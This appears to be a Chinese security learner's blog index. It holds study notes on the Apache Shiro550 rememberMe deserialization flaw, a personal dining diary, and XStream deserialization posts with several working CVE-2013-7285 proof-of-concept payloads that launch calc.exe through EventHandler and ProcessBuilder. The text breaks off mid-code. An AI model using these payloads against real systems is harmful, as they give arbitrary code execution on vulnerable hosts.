<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Shiro550</title>
    <link href="/2022/03/14/Shiro550/"/>
    <url>/2022/03/14/Shiro550/</url>
    
    <content type="html"><![CDATA[<h1 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h1><p>安装环境是真的头疼。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/apache/</span>shiro.git<br>cd shiro<br>git checkout shiro-root-<span class="hljs-number">1.2</span>.<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>然后将samples&#x2F;web文件拖入进idea。然后会有些报错啥的情况，反正弄了半天很头疼。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053356.png" alt="QQ截图20220313222244"></p><p>抓包一下得到：<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053799.png" alt="QQ截图20220313225727"></p><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142003271.png" alt="QQ截图20220314200304"></p><p>官方说的是<strong>CookieRememberMeManager</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053853.png" alt="QQ截图20220314200414"></p><p>下入断点<strong>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</strong></p><p>跟进一下加密。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053927.png" alt="QQ截图20220314200541"></p><p>简单跟了一下流程。<br>这里可以其密钥：</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142018769.png"></p><p>最后会将加密的东西写入cookie。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053515.png" alt="QQ截图20220314201754"></p><p>抓包看一下。</p><p>那么可以来分析一下流程。中间有些不想截图，tomcat调试真的头疼。</p><ul><li>先将用户序列化成数组。</li><li>对其使用ase加密（唯一密钥且我们可知）。</li><li>base64编码。</li><li>写入cookie的rememberme字段。</li></ul><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>下入断点<strong>org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity</strong></p><p>跟进。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053541.png" alt="QQ截图20220314203449"></p><p>获取cookie内容。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053502.png" alt="QQ截图20220314203529"></p><p>并且进行base64解码。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053022.png" alt="QQ截图20220314203606"></p><p>继续跟进。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142053805.png" alt="QQ截图20220314203725"></p><p>总结：</p><ul><li>获取cookie值</li><li>base64解码</li><li>aes解密</li><li>反序列化</li></ul><p>这里如何调试。</p><p>1、启动tomcat第一次登陆注册，钩上rememberMe，之后正常登陆，抓包留存</p><p>2、在解密这里下断点，在登录状态下，删除JSESSIONID字段，发送第一步保存的数据包，</p><p>就可解密。搞清楚怎么加密和解密。就来打一下。</p>]]></content>
    
    
    <categories>
      
      <category>Shiro</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>白色情人节</title>
    <link href="/2022/03/14/%E7%99%BD%E8%89%B2%E6%83%85%E4%BA%BA%E8%8A%82/"/>
    <url>/2022/03/14/%E7%99%BD%E8%89%B2%E6%83%85%E4%BA%BA%E8%8A%82/</url>
    
    <content type="html"><![CDATA[<h1 id="白色情人节"><a href="#白色情人节" class="headerlink" title="白色情人节"></a>白色情人节</h1><p>哪里来的这么多情人节？？不过刚好记录下，上周末出去happy的两天。</p><p>好久没见面了，宝贝扎了个马尾。在老地方见面，唉哟看了好几眼都没认出来（一定是太久没见的原因，或者贝贝变得更好看了~）。然后就去逛街。嗯，EMMM（男生就是工具人，身上全是包）。虽然快乐，但是好累。我脚丫子还起了水泡。！！！！回到学校才发现。</p><p>感觉每次出去玩都是在吃吃吃吃。这不这次又吃了这么多。<br>先来看看喝的。</p><h2 id="小美人"><a href="#小美人" class="headerlink" title="小美人"></a>小美人</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203142007206.jpg"></p><h2 id="民宿"><a href="#民宿" class="headerlink" title="民宿"></a>民宿</h2><p>看了<strong>消失的客人</strong>，表示晚上看，我也有些害怕~！（没有拍照记录。）</p><h2 id="饮料"><a href="#饮料" class="headerlink" title="饮料"></a>饮料</h2><p>生理期还是喝了很多冰的。希望以后来姨妈肚子疼别找我。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141741811.jpg" alt="8e7fdaa7faa23c697e3ee273c40d2cc"><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141741405.jpg" alt="1034252e7240e9a99c788e499b81cf7"></p><p>些许潦草的绿和紫。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141742949.jpg" alt="1e68af5958d7432c513f0048eeed19d"></p><h2 id="吃"><a href="#吃" class="headerlink" title="吃"></a>吃</h2><h3 id="烤匠"><a href="#烤匠" class="headerlink" title="烤匠"></a>烤匠</h3><p>吃过很多次了，但是每次都感觉还是一如既往的好吃。还吃了个生蚝。然后3min中kou’gan口感最佳的豆腐。最后应该是被我一个人吃完了。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141743915.jpg" alt="5f4443b2c2ef8e2f55345edec469423"></p><h3 id="江南"><a href="#江南" class="headerlink" title="江南"></a>江南</h3><p>肥而不腻的东坡肉。但是由于没有解腻菜。宝贝吃不了太多，基本被我一个人干完了。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141745074.jpg" alt="7c7dc08afe29898eef427727d0d8e99"></p><p>超级鲜的虾仁。（做的真的挺棒的（得到我和宝贝的赞同！！））</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141745116.jpg" alt="3f3e0fcd28b604d2f97b017cbac4e71"></p><p>emmm，还有个糖醋里脊。吃起来真的不咋滴。（但是还是推荐菜，就离离原上普。）</p><h3 id="忘了名字的（眉山川菜）"><a href="#忘了名字的（眉山川菜）" class="headerlink" title="忘了名字的（眉山川菜）"></a>忘了名字的（眉山川菜）</h3><p>姑且叫它白斩鸡</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141747984.jpg" alt="ea37fdbb5d6fd18f278cba8bddb7349"></p><p>辣辣辣辣，但是宝贝就爱吃里面的萝卜丝，就很离谱。第一次看宝贝，吃的辣出汗水然后还要一直吃。哈哈哈。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141748618.jpg" alt="d74c56e97f18d2e29624f63ec8eed34"></p><p>美丽的天鹅腿<del>.</del></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141748053.jpg"></p><p>又是虾仁，吃起来还是非常不错。就是又甜又辣（有点怪异！）</p><h2 id="蛋糕"><a href="#蛋糕" class="headerlink" title="蛋糕"></a>蛋糕</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141750347.jpg" alt="014476fafa3edcd47f3abcc2e832f55"></p><p>提出严重批评，浪费！</p><h2 id="离谱"><a href="#离谱" class="headerlink" title="离谱"></a>离谱</h2><p>我亲爱的宝贝连着吃了几天的好吃的。然后回学校，明明很累。然后还不饿。结果晚上吃泡面。属实让我无语住了，下次带猪儿出去吃草。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141758553.png" alt="image-20220314175849105"></p>]]></content>
    
    
    <categories>
      
      <category>游玩记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爱情</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XStream（CVE-2013-7285）</title>
    <link href="/2022/03/10/XStream%EF%BC%88CVE-2013-7285%EF%BC%89/"/>
    <url>/2022/03/10/XStream%EF%BC%88CVE-2013-7285%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="XStream（CVE-2013-7285）"><a href="#XStream（CVE-2013-7285）" class="headerlink" title="XStream（CVE-2013-7285）"></a>XStream（CVE-2013-7285）</h1><p>看了很多博主，还是<a href="http://www.mi1k7ea.com/2019/10/21/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90">mi1k7ea</a>师傅写的好。（哈哈哈建议直接跳转页面），我写的只供自己复习。</p><p>上一篇复习到类似cc链的一个类。<strong>EventHandle</strong>，并且实现了弹出计算器。还了解了其如何反序列化。<br>这里要补充一个新知识点。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101719235.png" alt="QQ截图20220310164057"></p><p><strong>dynamic-proxy标签在XStream反序列化之后会得到一个动态代理类对象，当访问了该对象的com.foo.Blah或com.foo.Woo这两个接口类中声明的方法时（即interface标签内指定的接口类），就会调用handler标签中的类方法com.foo.MyHandler。</strong></p><h2 id="POC（基于接口）"><a href="#POC（基于接口）" class="headerlink" title="POC（基于接口）"></a>POC（基于接口）</h2><p><strong>该接口可以是任意的public接口。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.io.HierarchicalStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XstreamDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;dynamic-proxy&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;    &lt;interface&gt;com.thoughtworks.xstream.io.HierarchicalStreamReader&lt;/interface&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;    &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;        &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;            &lt;command&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;        \t\t\t\t&lt;string&gt;calc.exe&lt;/string&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;            &lt;/command&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;        &lt;/target&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;        &lt;action&gt;start&lt;/action&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;    &lt;/handler&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;&lt;/dynamic-proxy&gt;&quot;</span>;<br>      <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>      <span class="hljs-type">HierarchicalStreamReader</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> (HierarchicalStreamReader)xStream.fromXML(s);<br>      obj.hasMoreChildren();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的<code>command</code>是<code>ProcessBuilder</code>接收的参数。</p><p>target同理。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101717586.png" alt="QQ截图20220310171656"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">obj.hasMoreChildren(); <span class="hljs-regexp">//</span>这一步相当于触发访问接口这一条件。<br></code></pre></td></tr></table></figure><h2 id="POC（基于SortedSet）"><a href="#POC（基于SortedSet）" class="headerlink" title="POC（基于SortedSet）"></a>POC（基于SortedSet）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.io.HierarchicalStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XStreamDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;sorted-set&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;string&gt;test&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;dynamic-proxy&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;command&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \t\t\t\t\t\t&lt;string&gt;calc.exe&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;/command&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;/target&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;action&gt;start&lt;/action&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;/handler&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;/dynamic-proxy&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&lt;/sorted-set&gt;&quot;</span>;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>    xStream.fromXML(s);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>简单总结一下。<br>在调试过程中。由于在这里进入<strong>putAll()</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101909251.png" alt="QQ截图20220310190929"></p><p>跟进！<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101902229.png" alt="QQ截图20220310190110"></p><p>这里我们会发现调用了，<strong>comparator</strong>，也就是说我们就触发了。接口这个条件。达到弹出计算器。</p><h2 id="POC（基于TreeMap）"><a href="#POC（基于TreeMap）" class="headerlink" title="POC（基于TreeMap）"></a>POC（基于TreeMap）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XstreamDemo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;tree-map&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;entry&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;string&gt;xsw6a&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;string&gt;xsw6_a&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;/entry&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;entry&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;dynamic-proxy&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    &lt;command&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \t\t\t\t\t\t\t\t&lt;string&gt;calc.exe&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    &lt;/command&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;/target&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;action&gt;start&lt;/action&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;/handler&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;/dynamic-proxy&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;string&gt;good&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;/entry&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&lt;/tree-map&gt;&quot;</span>;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>         xStream.fromXML(s);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101910615.png" alt="QQ截图20220310191043"></p><p>事实上是同理的。</p><p><strong>总结：想法设法触发接口。</strong></p><p>在XStream反序列化过程中，解析XML，将sorted-set标签识别出对应的TreeSetConverter转换器，再识别出sorted-set标签内有两个子元素，即string标签和dynamic-proxy标签；string标签会被识别出StringConverter转换器来解析出string标签内的字符串“foo”；dynamic-proxy标签会被识别出对应的DynamicProxyConverter转换器来解析出动态代理类对象；最后由于TreeSetConverter会对比两个子元素即调用$Proxy0.compareTo()来比较，而dynamic-proxy标签内实现了Comparable接口，因此由动态代理机制会触发dynamic-proxy标签内的handler标签指向的EventHandler类方法，从而利用反射机制实现任意代码执行。</p>]]></content>
    
    
    <categories>
      
      <category>XStream</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XStream（入门）</title>
    <link href="/2022/03/09/Xstream%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/"/>
    <url>/2022/03/09/Xstream%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Xstream-入门"><a href="#Xstream-入门" class="headerlink" title="Xstream(入门)"></a>Xstream(入门)</h1><h2 id="Demo（序列化）"><a href="#Demo（序列化）" class="headerlink" title="Demo（序列化）"></a>Demo（序列化）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span>  String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setName(<span class="hljs-string">&quot;xsw6_a&quot;</span>);<br>        person.setAge(<span class="hljs-number">20</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> xStream.toXML(person);<br>        System.out.println(s);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203092211796.png" alt="QQ截图20220309221126"></p><h2 id="Demo（反序列化）"><a href="#Demo（反序列化）" class="headerlink" title="Demo（反序列化）"></a>Demo（反序列化）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Unserialize</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;xsw6a.Person&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &lt;age&gt;20&lt;/age&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &lt;name&gt;xsw6_a&lt;/name&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&lt;/xsw6a.Person&gt;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> xStream.fromXML(s);<br>        System.out.println(o);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="EventHandler"><a href="#EventHandler" class="headerlink" title="EventHandler"></a>EventHandler</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203092257563.png" alt="QQ截图20220309225653"></p><p>这个类继承了，<strong>InvocationHandler</strong>。是不是很熟悉，一下就想到了cc链中的那个ann那个类。<strong>那么只要代理这个类，就会执行这个类的invoke方法。</strong><br>看一下如何走的。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203092301876.png" alt="QQ截图20220309230131"></p><p>一路跟进会来到这里。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203092312104.png" alt="QQ截图20220309230859"></p><p>这里会调用反射。</p><p>所以能够弹出计算器。</p><ul><li>targetMethod：ProcessBuilder.start()方法 （action参数）</li><li>target：构造好带有恶意命令的ProcessBuilder对象</li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6_a;<br><br><span class="hljs-keyword">import</span> java.beans.EventHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">HelloService</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">Bananer</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTrue</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HelloService</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;吃苹果&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Bananer</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;吃香蕉&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tester</span> &#123;<br>    <span 